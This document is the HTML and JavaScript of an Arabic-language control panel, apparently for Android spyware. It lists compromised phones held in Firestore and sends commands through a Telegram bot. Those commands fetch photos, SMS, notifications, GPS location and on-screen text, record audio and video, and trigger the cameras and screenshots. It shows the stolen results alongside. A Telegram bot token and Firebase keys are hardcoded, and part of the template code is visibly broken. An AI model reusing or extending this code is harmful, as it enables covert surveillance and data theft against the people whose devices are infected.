<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>CREFTEX — Control Center</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{--bg0:#05070d;--bg1:#0a0f1a;--bg2:#0f1623;--bg3:#141c2c;--line:rgba(99,130,180,.14);--lineh:rgba(99,130,180,.3);--tx:#e6ecf5;--txd:#8a9bb5;--txm:#5c6b82;--ac:#3b82f6;--acg:rgba(59,130,246,.35);--ok:#10b981;--okg:rgba(16,185,129,.25);--wn:#f59e0b;--dg:#ef4444;--pu:#8b5cf6;--cy:#06b6d4;--r:18px;--rs:12px;--rx:10px}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
body{font-family:'Cairo',sans-serif;background:var(--bg0);color:var(--tx);min-height:100vh;padding:20px 20px 60px;overflow-x:hidden}
body:before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 15% 10%,rgba(59,130,246,.12),transparent 40%),radial-gradient(circle at 85% 90%,rgba(139,92,246,.08),transparent 40%),radial-gradient(circle at 50% 50%,rgba(6,182,212,.04),transparent 60%);pointer-events:none}
.app{position:relative;max-width:1400px;margin:0 auto}
.hd{display:flex;align-items:center;justify-content:space-between;padding:16px 24px;background:linear-gradient(135deg,rgba(20,28,44,.9),rgba(15,22,35,.85));border:1px solid var(--line);border-radius:var(--r);margin-bottom:14px;backdrop-filter:blur(20px)}
.brand{display:flex;align-items:center;gap:12px}
.logo{width:44px;height:44px;border-radius:13px;background:linear-gradient(135deg,var(--ac),var(--cy));display:flex;align-items:center;justify-content:center;font-size:20px;box-shadow:0 8px 24px var(--acg)}
.brand h1{font-size:19px;font-weight:800;letter-spacing:.3px;background:linear-gradient(135deg,#60a5fa,#22d3ee);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.brand p{font-size:11px;color:var(--txm);letter-spacing:.5px}
.stats{display:flex;gap:14px}
.st{text-align:center;padding:7px 16px;background:rgba(10,15,26,.6);border:1px solid var(--line);border-radius:var(--rx);min-width:80px}
.st .n{font-size:19px;font-weight:800;color:var(--cy);font-family:'JetBrains Mono',monospace}
.st .n.ok{color:var(--ok)}
.st .l{font-size:10px;color:var(--txm);text-transform:uppercase;letter-spacing:.5px}
.tabs{display:flex;gap:8px;padding:8px;background:linear-gradient(135deg,rgba(20,28,44,.85),rgba(15,22,35,.8));border:1px solid var(--line);border-radius:var(--r);margin-bottom:20px;overflow-x:auto;scrollbar-width:none;position:sticky;top:10px;z-index:50;backdrop-filter:blur(20px)}
.tabs::-webkit-scrollbar{display:none}
.tab{flex-shrink:0;display:flex;align-items:center;gap:7px;padding:10px 18px;border-radius:12px;border:1px solid transparent;background:transparent;color:var(--txd);font-family:inherit;font-size:13px;font-weight:700;cursor:pointer;transition:all .18s;white-space:nowrap}
.tab .ic{font-size:15px}
.tab:hover{background:rgba(59,130,246,.08);color:var(--tx)}
.tab.on{background:linear-gradient(135deg,rgba(59,130,246,.25),rgba(6,182,212,.15));border-color:rgba(59,130,246,.4);color:#fff;box-shadow:0 4px 16px rgba(59,130,246,.2)}
.panel{background:linear-gradient(180deg,rgba(20,28,44,.85),rgba(15,22,35,.9));border:1px solid var(--line);border-radius:var(--r);padding:22px;margin-bottom:20px}
.p-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;padding-bottom:14px;border-bottom:1px solid var(--line);flex-wrap:wrap;gap:10px}
.p-title{font-size:16px;font-weight:700;display:flex;align-items:center;gap:10px}
.p-title .ic{font-size:19px}
.cnt{background:rgba(59,130,246,.15);color:var(--ac);padding:2px 10px;border-radius:20px;font-size:11px;font-weight:700}
.ibtn{width:32px;height:32px;border-radius:10px;background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.25);color:var(--ac);display:inline-flex;align-items:center;justify-content:center;cursor:pointer;transition:all .15s;font-size:14px}
.ibtn:active{transform:scale(.9)}
.devs{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px}
.dc{background:linear-gradient(135deg,rgba(30,41,59,.6),rgba(20,28,44,.5));border:1px solid var(--line);border-radius:var(--rs);padding:15px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
.dc:before{content:'';position:absolute;top:0;right:0;width:4px;height:100%;background:var(--txm)}
.dc.act:before{background:var(--ok);box-shadow:0 0 12px var(--okg)}
.dc.ina:before{background:var(--dg)}
.dc.sel{border-color:var(--ac);box-shadow:0 0 0 2px var(--acg),0 8px 24px rgba(59,130,246,.15)}
.dc:hover{border-color:var(--lineh)}
.dr1{display:flex;align-items:center;justify-content:space-between;margin-bottom:9px}
.dn{font-size:14.5px;font-weight:700;display:flex;align-items:center;gap:8px;flex:1;min-width:0}
.dn input{background:none;border:none;color:var(--tx);font-family:inherit;font-size:14.5px;font-weight:700;width:100%;outline:none;padding:2px 4px;border-radius:6px}
.dn input:focus{background:rgba(59,130,246,.15);box-shadow:0 0 0 1px var(--ac)}
.pill{padding:3px 9px;border-radius:20px;font-size:10px;font-weight:700;flex-shrink:0}
.pill.act{background:rgba(16,185,129,.15);color:var(--ok);border:1px solid rgba(16,185,129,.3)}
.pill.ina{background:rgba(239,68,68,.1);color:var(--dg);border:1px solid rgba(239,68,68,.25)}
.dr2{display:flex;flex-direction:column;gap:3px;font-size:11px;color:var(--txm);font-family:'JetBrains Mono',monospace;direction:ltr;text-align:left}
.dr2 b{color:var(--txd);font-weight:500;font-family:'Cairo',sans-serif}
.empty{text-align:center;padding:50px 20px;color:var(--txm)}
.empty .ic{font-size:50px;margin-bottom:10px;opacity:.4}
.empty p{font-size:13px}
.cgr{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
.cg{background:rgba(10,15,26,.5);border:1px solid var(--line);border-radius:var(--rs);padding:16px}
.cgt{font-size:12px;font-weight:700;color:var(--txd);text-transform:uppercase;letter-spacing:1px;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.cgt:before{content:'';width:3px;height:12px;background:var(--ac);border-radius:2px}
.cbs{display:grid;grid-template-columns:1fr;gap:8px}
.cbs.c2{grid-template-columns:1fr 1fr}
.cb{padding:13px 15px;border-radius:12px;border:1px solid transparent;background:linear-gradient(135deg,rgba(30,41,59,.6),rgba(20,28,44,.4));color:var(--tx);font-family:inherit;font-size:13.5px;font-weight:600;cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:10px;text-align:right}
.cb .ic{font-size:17px;flex-shrink:0}
.cb:hover{border-color:var(--lineh);background:linear-gradient(135deg,rgba(40,52,74,.7),rgba(25,34,52,.6))}
.cb:active{transform:scale(.98)}
.cb.p{border-color:rgba(59,130,246,.3)}.cb.s{border-color:rgba(16,185,129,.3)}.cb.w{border-color:rgba(245,158,11,.3)}.cb.d{border-color:rgba(239,68,68,.3)}.cb.v{border-color:rgba(139,92,246,.3)}
.selbar{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.selbar select{background:rgba(10,15,26,.8);border:1px solid var(--lineh);color:var(--tx);font-family:inherit;font-size:13px;font-weight:600;padding:9px 14px;border-radius:10px;outline:none;cursor:pointer;max-width:240px}
.selbar select:focus{border-color:var(--ac)}
.clr{padding:8px 15px;border-radius:10px;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:var(--dg);font-family:inherit;font-size:12px;font-weight:700;cursor:pointer}
.clr:active{transform:scale(.95)}
.qa{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:18px}
.lg-body{background:#030509;border:1px solid var(--line);border-radius:var(--rs);padding:18px;min-height:380px;max-height:680px;overflow-y:auto}
.lg-body::-webkit-scrollbar{width:8px}
.lg-body::-webkit-scrollbar-thumb{background:var(--lineh);border-radius:4px}
.le{display:flex;gap:13px;padding:13px 15px;margin-bottom:10px;background:rgba(20,28,44,.5);border:1px solid var(--line);border-radius:12px;animation:fu .35s ease;position:relative}
@keyframes fu{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
.le:before{content:'';position:absolute;right:0;top:0;bottom:0;width:3px;border-radius:0 12px 12px 0;background:var(--ac)}
.le.fb:before{background:var(--cy)}
.le.fu:before{background:var(--ok)}
.le.fp:before{background:var(--pu)}
.le .av{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--ac),var(--cy));display:flex;align-items:center;justify-content:center;font-size:17px;flex-shrink:0}
.le.fb .av{background:linear-gradient(135deg,var(--cyan,#06b6d4),#0ea5e9)}
.le.fu .av{background:linear-gradient(135deg,var(--ok),#059669)}
.le.fp .av{background:linear-gradient(135deg,var(--pu),var(--ac))}
.le .co{flex:1;min-width:0}
.le .mt{display:flex;align-items:center;gap:10px;margin-bottom:5px}
.le .who{font-size:12px;font-weight:700;color:var(--txd)}
.le .whn{font-size:11px;color:var(--txm);font-family:'JetBrains Mono',monospace;direction:ltr}
.le .bd{font-size:13.5px;line-height:1.7;white-space:pre-wrap;word-break:break-word}
.le .bd img{max-width:100%;max-height:500px;border-radius:10px;margin-top:8px;border:1px solid var(--line);display:block;cursor:pointer}
.le .bd audio,.le .bd video{width:100%;margin-top:8px;border-radius:10px}
.lemp{text-align:center;padding:80px 20px;color:var(--txm)}
.lemp .ic{font-size:56px;margin-bottom:14px;opacity:.3}
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);padding:13px 22px;border-radius:14px;font-size:13.5px;font-weight:700;background:rgba(20,28,44,.95);border:1px solid var(--lineh);backdrop-filter:blur(20px);transition:transform .3s;z-index:9999;box-shadow:0 12px 40px rgba(0,0,0,.5);max-width:90%}
.toast.show{transform:translateX(-50%) translateY(0)}
.toast.ok{border-color:rgba(16,185,129,.5);color:var(--ok)}
.toast.err{border-color:rgba(239,68,68,.5);color:var(--dg)}
.toast.wait{border-color:rgba(59,130,246,.5);color:var(--ac)}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:99999;display:none;align-items:center;justify-content:center;padding:40px}
.modal.show{display:flex}
.modal img{max-width:100%;max-height:90vh;border-radius:16px;box-shadow:0 20px 80px rgba(0,0,0,.8)}
.mx{position:absolute;top:24px;right:24px;width:44px;height:44px;border-radius:50%;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);color:#fff;font-size:22px;cursor:pointer}
@media(max-width:900px){.cgr{grid-template-columns:1fr}}
@media(max-width:640px){
body{padding:10px 10px 50px}
.hd{padding:12px 14px;flex-wrap:wrap;gap:10px}
.stats{gap:7px}
.st{padding:6px 11px;min-width:64px}
.st .n{font-size:16px}
.tabs{padding:6px;gap:6px}
.tab{padding:8px 13px;font-size:12px}
.panel{padding:15px}
.cbs.c2{grid-template-columns:1fr 1fr}
.lg-body{padding:11px;min-height:320px}
.devs{grid-template-columns:1fr}
}
</style>
</head>
<body>
<div class="app">

<script>
const TELEGRAM_BOT_TOKEN="8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM",TELEGRAM_CHAT_ID="8599240795",FIREBASE_API_KEY="AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg",FIREBASE_PROJECT_ID="hhhxh-5ebe4";
const TG_API=`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`,TG_FILE=`https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}`,FS_DEVICES=`https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/devices`,FS_MESSAGES=`https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/messages`;
let lastUpdateId=0,messageCache={},selectedDevice=null,allMessages=[],currentTab='home',devices=[],deviceNames=JSON.parse(localStorage.getItem('device_names')||'{}');
const SEC={
 home:{ic:'🏠',lb:'الرئيسية'},
 photos:{ic:'🖼',lb:'الصور',cmds:[['/photos','📸','كل الصور','p'],['/photos 50','🖼','آخر 50 صورة','p']],kw:['/photos','صور','صورة','📸','🖼'],photo:true},
 sms:{ic:'📩',lb:'الرسائل',cmds:[['/sms','📩','كل الرسائل SMS','s']],kw:['/sms','sms','رسالة','رسائل','📩']},
 notifs:{ic:'🔔',lb:'الإشعارات',cmds:[['/notifs','🔔','كل الإشعارات','s']],kw:['/notifs','notif','إشعار','إشعارات','🔔']},

 loc:{ic:'📍',lb:'الموقع',cmds:[['/location','📍','الموقع الحالي','s']],kw:['/location','موقع','📍','gps','خرائط']},
 acc:{ic:'📝',lb:'النصوص على الشاشة',cmds:[['/accessibility','📝','نصوص الشاشة','v']],kw:['/accessibility','نصوص','الشاشة','📝']},
 audio:{ic:'🎤',lb:'الأصوات',cmds:[['/audio_start','🎤','بدء التسجيل','s'],['/audio_stop','⏹','إيقاف التسجيل','d']],kw:['/audio','صوت','صوتي','تسجيل','🎤','voice','audio']},
 cam:{ic:'📸',lb:'الكاميرا',cmds:[['/cam_front','🤳','كاميرا أمامية','v'],['/cam_back','📸','كاميرا خلفية','v'],['/screen','📷','لقطة شاشة','w'],['/video','📹','تسجيل فيديو','w'],['/screen_stop','🛑','إيقاف اللقطات','d']],kw:['/cam','/screen','/video','كاميرا','لقطة','فيديو','🤳','📷','📹','🛑']}
};
const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
function toast(m,t='wait'){const e=document.getElementById('toast');e.textContent=m;e.className='toast show '+t;clearTimeout(window.__tm);window.__tm=setTimeout(()=>e.classList.remove('show'),3000)}
/* ═══ التبويبات ═══ */
function renderTabs(){document.getElementById('tabs').innerHTML=Object.entries(SEC).map(([k,v])=>`<button class="tab ${currentTab===k?'on':''}" onclick="setTab('${k}')"><span class="ic">${v.ic}</span>${v.lb}</button>`).join('')}
function setTab(k){currentTab=k;renderTabs();renderView()}
/* ═══ العرض ═══ */
function renderView(){const v=document.getElementById('view');if(currentTab==='home')v.innerHTML=homeHTML();else v.innerHTML=secHTML(currentTab);fillDevices();renderCurrentLog()}
function homeHTML(){return `
<div class="panel">
 <div class="p-head"><div class="p-title"><span class="ic">📱</span>الأجهزة <span class="cnt" id="devCount">0</span></div><div class="ibtn" onclick="loadDevices()" title="تحديث">🔄</div></div>
 <div class="devs" id="devicesList"></div>
</div>
<div class="panel">

 <div class="cgr">
  <div class="cg"><div class="cgt">البيانات الأساسية</div><div class="cbs">

   <button class="cb p" onclick="sendCmd('/photos 50')"><span class="ic">🖼</span>آخر 50 صورة</button>
   <button class="cb s" onclick="sendCmd('/sms')"><span class="ic">📩</span>كل الرسائل SMS</button>
   <button class="cb s" onclick="sendCmd('/notifs')"><span class="ic">🔔</span>كل الإشعارات</button>
   <button class="cb v" onclick="sendCmd('/accessibility')"><span class="ic">📝</span>نصوص الشاشة</button>
  </div></div>
  <div class="cg"><div class="cgt">الجهاز والموقع</div><div class="cbs">
   <button class="cb p" onclick="sendCmd('/info')"><span class="ic">📊</span>معلومات الجهاز</button>
   <button class="cb s" onclick="sendCmd('/location')"><span class="ic">📍</span>الموقع الحالي</button>
   <button class="cb w" onclick="sendCmd('/screen')"><span class="ic">📷</span>لقطة شاشة</button>
   <button class="cb w" onclick="sendCmd('/video')"><span class="ic">📹</span>تسجيل فيديو</button>

  </div></div>

  </div></div>
 </div>
</div>
${logPanelHTML('كل النشاط')}`}
function secHTML(k){const s=SEC[k];return `
<div class="panel">
 <div class="p-head">
  <div class="p-title"><span class="ic">${s.ic}</span>${s.lb}</div>

   <select id="devPick" onchange="pickDevice(this.value)"><option value="">— اختر جهازًا —</option></select>

/* ═══ الأجهزة ═══ */
const devName=d=>deviceNames[d.id]||`${d.manufacturer} ${d.model}`;
function fillDevices(){
 const list=document.getElementById('devicesList');
 if(list){
  document.getElementById('devCount').textContent=devices.length;
  list.innerHTML=devices.length?devices.map(d=>{const ls=d.lastSeen>0?new Date(d.lastSeen).toLocaleString('ar-EG',{hour:'2-digit',minute:'2-digit',day:'2-digit',month:'2-digit'}):'—';return `
  <div class="dc ${d.isActive?'act':'ina'} ${selectedDevice&&selectedDevice.id===d.id?'sel':''}" onclick="selectDevice('${esc(d.id)}')">
   <div class="dr1">
    <div class="dn"><span>📱</span><input type="text" value="${esc(devName(d))}" placeholder="${esc(d.manufacturer+' '+d.model)}" onclick="event.stopPropagation()" onchange="renameDevice(this,'${esc(d.id)}')"></div>
    <div class="pill ${d.isActive?'act':'ina'}">${d.isActive?'🟢':'🔴'}</div>
   </div>
   <div class="dr2"><div><b>Android:</b> ${esc(d.android)}</div><div><b>آخر ظهور:</b> ${ls}</div><div><b>ID:</b> ${esc(d.id)}</div></div>
  </div>`}).join(''):'<div class="empty"><div class="ic">📭</div><p>لا أجهزة مسجّلة بعد</p></div>';
 }
 const pick=document.getElementById('devPick');
 if(pick)pick.innerHTML='<option value="">— اختر جهازًا —</option>'+devices.map(d=>`<option value="${esc(d.id)}" ${selectedDevice&&selectedDevice.id===d.id?'selected':''}>${esc(devName(d))}${d.isActive?' 🟢':''}</option>`).join('');
}
async function loadDevices(){
 try{
  const res=await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=100`),data=await res.json(),docs=data.documents||[];
  devices=docs.map(d=>{const f=d.fields||{},ls=parseInt(f.last_seen_ms?.integerValue||'0');return{id:f.id?.stringValue||'',brand:f.brand?.stringValue||'',manufacturer:f.manufacturer?.stringValue||'',model:f.model?.stringValue||'',android:f.android?.stringValue||'',lastSeen:ls,isActive:(Date.now()-ls)<10*60*1000}}).sort((a,b)=>b.lastSeen-a.lastSeen);
  document.getElementById('statDevices').textContent=devices.length;
  document.getElementById('statActive').textContent=devices.filter(d=>d.isActive).length;
  if(selectedDevice){const f=devices.find(d=>d.id===selectedDevice.id);if(f)selectedDevice=f}
  fillDevices();
 }catch(e){const l=document.getElementById('devicesList');if(l)l.innerHTML='<div class="empty"><div class="ic">⚠️</div><p>تعذّر تحميل الأجهزة</p></div>'}
}
function renameDevice(inp,id){const n=inp.value.trim();if(n)deviceNames[id]=n;else delete deviceNames[id];localStorage.setItem('device_names',JSON.stringify(deviceNames));toast('✅ تم حفظ الاسم','ok');fillDevices()}
function selectDevice(id){const d=devices.find(x=>x.id===id);if(!d)return;selectedDevice=d;renderView();toast('✅ تم اختيار: '+devName(d),'ok')}
function pickDevice(id){if(!id){selectedDevice=null;renderView();return}selectDevice(id)}
function clearSelection(){selectedDevice=null;renderView()}
/* ═══ الأوامر ═══ */
async function sendCmd(cmd){
 if(!selectedDevice){toast('⚠️ اختر جهازًا أولًا','err');return}
 toast(`⏳ إرسال: ${cmd}`,'wait');
 try{
  const res=await fetch(`${TG_API}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:`${cmd} #${selectedDevice.id}`})}),data=await res.json();
  if(data.ok){toast(`✅ ${cmd}`,'ok');setTimeout(()=>{pullIncoming();loadMessages(false)},2500)}
  else toast(`❌ ${data.description}`,'err');
 }catch(e){toast(`❌ ${e.message}`,'err')}
}
/* ═══ الرسائل ═══ */
async function pullIncoming(){
 try{
  const off=lastUpdateId===0?0:lastUpdateId+1,res=await fetch(`${TG_API}/getUpdates?offset=${off}&limit=100`),data=await res.json();
  if(!data.ok)return;
  for(const u of(data.result||[])){
   lastUpdateId=Math.max(lastUpdateId,u.update_id);
   const m=u.message;if(!m)continue;
   const key=`in_${m.message_id}`;if(messageCache[key])continue;messageCache[key]=true;
   if(m.text)await saveToFS({chat_id:m.chat.id,type:'text',text:m.text,time_ms:m.date*1000,from_user:true});
   else if(m.photo&&m.photo.length>0)await saveToFS({chat_id:m.chat.id,type:'photo',file_id:m.photo[m.photo.length-1].file_id,caption:m.caption||'',time_ms:m.date*1000,from_user:true});
  }
 }catch(e){}
}
async function saveToFS(o){
 try{
  const f={};for(const[k,v]of Object.entries(o)){if(typeof v==='number')f[k]={integerValue:String(v)};else if(typeof v==='boolean')f[k]={booleanValue:v};else f[k]={stringValue:String(v)}}
  await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fields:f})});
 }catch(e){}
}
async function loadMessages(showT){
 if(showT)toast('⏳ جلب الرسائل...','wait');
 try{
  const res=await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}&pageSize=500`),data=await res.json();
  allMessages=(data.documents||[]).map(d=>{const f=d.fields||{};return{type:f.type?.stringValue||'text',text:f.text?.stringValue||'',file_id:f.file_id?.stringValue||'',caption:f.caption?.stringValue||'',time_ms:parseInt(f.time_ms?.integerValue||'0'),from_user:f.from_user?.booleanValue||false}}).sort((a,b)=>a.time_ms-b.time_ms);
  document.getElementById('statMsgs').textContent=allMessages.length;
  renderCurrentLog();
  if(showT)toast(`✅ ${allMessages.length} رسالة`,'ok');
 }catch(e){if(showT)toast(`❌ ${e.message}`,'err')}
}
function matchSec(m,k){const s=SEC[k];const txt=(m.text+' '+m.caption).toLowerCase();if(s.photo&&m.type==='photo')return true;return s.kw.some(w=>txt.includes(w.toLowerCase()))}
function renderCurrentLog(){
 const body=document.getElementById('logBody');if(!body)return;
 let list=allMessages;
 if(currentTab!=='home')list=allMessages.filter(m=>matchSec(m,currentTab));
 if(!list.length){body.innerHTML='<div class="lemp"><div class="ic">📭</div><p>لا يوجد نشاط في هذا القسم بعد</p></div>';return}
 body.innerHTML='';
 for(const m of list){
  const isBot=!m.from_user,isPhoto=m.type==='photo';
  const time=new Date(m.time_ms).toLocaleString('ar-EG',{hour:'2-digit',minute:'2-digit',day:'2-digit',month:'2-digit'});
  const e=document.createElement('div');
  e.className='le '+(isBot?'fb':'fu')+(isPhoto?' fp':'');
  let av=isBot?'🤖':'👤';if(isPhoto)av='📸';
  let inner='';
  if(isPhoto&&m.file_id){inner=`<div class="bd">📸 صورة${m.caption?' — '+esc(m.caption):''}</div><img data-file="${esc(m.file_id)}" onclick="openModal(this.src)">`}
  else inner=`<div class="bd">${esc(m.text)}</div>`;
  e.innerHTML=`<div class="av">${av}</div><div class="co"><div class="mt"><span class="who">${isBot?'البوت':'أنت'}</span><span class="whn">${time}</span></div>${inner}</div>`;
  body.appendChild(e);
  const img=e.querySelector('img[data-file]');if(img)loadMedia(m.file_id,img);
 }
 body.scrollTop=body.scrollHeight;
}
async function loadMedia(fid,el){try{const r=await fetch(`${TG_API}/getFile?file_id=${fid}`),d=await r.json();if(d.ok&&d.result.file_path)el.src=`${TG_FILE}/${d.result.file_path}`}catch(e){}}
function openModal(src){document.getElementById('modalImg').src=src;document.getElementById('imgModal').classList.add('show')}
function closeModal(){document.getElementById('imgModal').classList.remove('show')}
/* ═══ التشغيل ═══ */
async function refresh(){await pullIncoming();await loadMessages(false)}
renderTabs();renderView();
loadDevices();loadMessages(false);refresh();
setInterval(loadDevices,20000);
setInterval(refresh,15000);
</script>
</body>
</html>
